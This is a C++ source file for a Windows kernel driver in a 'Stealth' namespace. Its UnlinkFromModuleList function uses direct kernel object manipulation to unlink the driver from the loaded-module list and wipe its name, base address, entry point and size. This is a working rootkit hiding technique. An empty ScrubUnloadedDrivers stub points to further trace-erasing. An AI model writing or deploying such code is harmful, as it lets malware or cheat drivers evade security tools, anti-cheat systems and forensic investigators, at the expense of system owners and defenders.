#include "stealth.h"

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    PVOID          ExceptionTable;
    ULONG          ExceptionTableSize;
    PVOID          GpValue;
    PVOID          NonPagedDebugInfo;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG          Flags;
    USHORT         LoadCount;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

namespace Stealth {

void UnlinkFromModuleList(PDRIVER_OBJECT self) {
    if (!self || !self->DriverSection) return;

    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)self->DriverSection;

    LIST_ENTRY* prev = entry->InLoadOrderLinks.Blink;
    LIST_ENTRY* next = entry->InLoadOrderLinks.Flink;
    if (prev && next && prev != &entry->InLoadOrderLinks) {
        prev->Flink = next;
        next->Blink = prev;
        entry->InLoadOrderLinks.Flink = &entry->InLoadOrderLinks;
        entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;
    }

    if (entry->BaseDllName.Buffer && entry->BaseDllName.MaximumLength) {
        RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.MaximumLength);
        entry->BaseDllName.Length = 0;
    }
    if (entry->FullDllName.Buffer && entry->FullDllName.MaximumLength) {
        RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.MaximumLength);
        entry->FullDllName.Length = 0;
    }

    entry->SizeOfImage = 0;
    entry->DllBase     = nullptr;
    entry->EntryPoint  = nullptr;
}

void ScrubUnloadedDrivers(void) {
}

}
